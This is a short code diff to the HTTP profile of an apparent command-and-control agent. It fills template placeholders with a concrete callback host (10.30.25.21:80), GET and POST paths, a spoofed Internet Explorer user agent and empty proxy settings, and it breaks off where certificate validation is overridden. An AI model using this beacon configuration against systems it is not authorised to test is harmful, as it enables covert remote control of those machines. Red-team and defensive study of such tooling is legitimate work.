@@ -34,18 +34,18 @@ namespace Agent.Profiles
             this.crypt = crypto;
             this.logger = logger;
             this.messageManager = messageManager;
-            int callbackPort = Int32.Parse("callback_port");
-            string callbackHost = "callback_host";
-            string getUri = "get_uri";
-            string queryPath = "query_path_name";
-            string postUri = "post_uri";
-            this.userAgent = "%USERAGENT%";
-            this.hostHeader = "%HOSTHEADER%";
+            int callbackPort = Int32.Parse("80");
+            string callbackHost = "http://10.30.25.21";
+            string getUri = "q";
+            string queryPath = "index";
+            string postUri = "data";
+            this.userAgent = "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
+            this.hostHeader = "";
             this.getURL = $"{callbackHost.TrimEnd('/')}:{callbackPort}/{getUri}?{queryPath}=";
             this.postURL = $"{callbackHost.TrimEnd('/')}:{callbackPort}/{postUri}";
-            this.proxyHost = "proxy_host:proxy_port";
-            this.proxyPass = "proxy_pass";
-            this.proxyUser = "proxy_user";
+            this.proxyHost = ":";
+            this.proxyPass = "";
+            this.proxyUser = "";
 
             //Might need to make this configurable
             ServicePointManager.ServerCertificateValidationCallback =
